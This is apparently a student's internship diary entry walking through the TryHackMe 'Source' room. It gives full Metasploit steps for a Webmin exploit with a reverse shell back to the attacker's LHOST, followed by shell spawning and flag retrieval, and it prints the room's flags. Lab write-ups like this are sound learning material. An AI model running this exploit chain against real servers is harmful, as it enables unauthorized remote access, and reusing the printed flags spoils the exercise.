# Cyber Security Internship Diary

Welcome back to my Cyber Security Internship Diary! This repository documents my daily learnings and experiences during my internship in the field of Cyber Security. Here, I'll share insights, concepts, and practices that I encounter throughout this journey.

## Day-09: TryHackMe Room ([Source](https://tryhackme.com/r/room/source))

Today, I explored several new tools and concepts while working through a TryHackMe room. Here are the key learnings:

### 1. Rustscan
Rustscan is a fast port scanner that is designed to quickly scan for open ports on a target machine. It uses the Rust programming language, which provides both speed and reliability.

### 2. Metasploit
Metasploit is a powerful penetration testing framework that helps security professionals identify and exploit vulnerabilities in various systems. It offers a wide range of tools and exploits that can be used to simulate real-world attacks.

### 3. MFConsole (Usage Example)
MFConsole is the command-line interface for Metasploit. It allows users to interact with the Metasploit framework and perform various tasks such as launching exploits and running auxiliary modules.

**Usage Example:**
MFConsole can be used to deploy payloads in scenarios such as ransomware attacks or other malicious activities. For instance, an attacker might use Metasploit to deliver a ransomware payload that encrypts files on the target machine, demanding a ransom for decryption.

### 4. RHOSTS & LHOST
- **RHOSTS:** This stands for "Remote Hosts" and refers to the IP address(es) of the target machine(s) that you are attacking. It tells Metasploit which machine(s) to direct the exploit towards.
  
- **LHOST:** This stands for "Local Host" and refers to the IP address of the attacker's machine. It is used to receive the connection back from the target machine once the payload has been executed.

### 5. Web-Extension Hack-Tools
Hack-Tools is a web extension that provides a wide range of tools for web penetration testing. It includes features such as encoding/decoding, IP address lookup, and various other utilities that are useful for web security assessments.

### 6. Nmap vs. Rustscan

| Feature        | Nmap                                      | Rustscan                               |
|----------------|-------------------------------------------|----------------------------------------|
| Speed          | Slower due to comprehensive scanning      | Very fast, designed for quick scans    |
| Flexibility    | Highly flexible with many options         | Less flexible, focuses on speed        |
| Programming    | Written in C                              | Written in Rust                        |
| Usage          | Widely used for detailed network analysis | Best for quick port scanning           |
| Installation   | Available on most systems                 | Requires installation of Rust          |

### Here is how i did the CTF 

#### Starting with the setting up the openvpn with the room if you don't know how to setup the openvpn then follow this [Openvpn-setup](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-07/README.md).
After that i have learned a new and cool way to store the to store the ip address of the machine given to us by the tryhackme
```
sudo nano /etc/hosts
ip address  source.com

```
Now we have kept the ip in a very cool way lets nmap the site so we can get the deatils 
```
 sudo nmap -Pn -p- -sV --script vuln -vv -oN noping-sv-sc-source.txt source.com

```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/nmap%20scan.png?raw=true)

When you try this you will know that it is taking a long time we can do a short alternative download rustscan. Download this only from this site their are malicous code on the internet [Rustscan](https://github.com/RustScan/RustScan/releases/download/2.2.3/rustscan_2.2.3_amd64.deb)
after then we run the command 
```
 sudo rustscan -a source.com -- --script vuln -oN rustscan-sv-sc-source.txt

```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/rustscan-report.png?raw=true)

But the problem with the rustscan is that it only gives us the port avaliable as fast as possible but it doesn not provide us the services running on that port. So we need the nmap for this 
```
 sudo nmap -p(port no.) -sV source.com
  
```
After we get the service search the exploit on the exploitdb 

We use Metasploit for the futher the nessary commands for the further excutions are listed below
```
 msfconsole

```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/msfconsole.png?raw=true)
```
search Webmin

```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/search%20webmin.png?raw=true)
```
use 7
show options
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/use7-show-option.png?raw=true)
```
set RHOSTS 10.10.180.246
set LHOST 10.17.88.92
set LPORT 5566
show options
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/Rhosts.png?raw=true)

Now after all the above the things do these final things one after anothers 
```
exploit
set AutoCheck false
show payloads (select the payload with no. 41)
set payload cmd/unix/reverse
set SSL true
show options 
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/SSL%20true.png?raw=true)

After all above things now just put this command and then hit enter.
``` exploit ```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-09/exploit.png?raw=true)
After this enter the following commands 
```
python -c 'import pty; pty.spawn("/bin/bash")'
cd
ls
cat root.txt

```

After this lets find the user.txt 
```
cd /ho
ls
cd /dark
ls
cat user.txt
```
# Task1 
### Answer the questions below
#### user.txt
``` THM{SUPPLY_CHAIN_COMPROMISE} ```
#### root.txt
``` THM{UPDATE_YOUR_INSTALL} ```
## Conclusion
Today, I delved into several advanced tools and concepts that are crucial for penetration testing and cyber security. These tools, including Rustscan and Metasploit, along with their various features and commands, are invaluable for any security professional. 

Stay tuned for more updates and insights from my ongoing journey in the world of Cyber Security!

